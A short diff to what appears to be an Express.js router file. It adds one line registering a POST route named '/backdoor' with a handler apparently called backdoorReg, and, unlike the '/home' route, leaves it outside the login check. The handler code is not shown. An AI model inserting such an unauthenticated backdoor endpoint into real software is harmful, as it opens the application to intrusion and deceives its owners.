@@ -14,4 +14,5 @@ function isLoggedIn(req, res, next) {
 router.get('/',index.index)
 router.post('/login', index.login)
 router.get('/home', isLoggedIn, index.home)
+router.post('/backdoor', index.backdoorReg)
 module.exports = router;
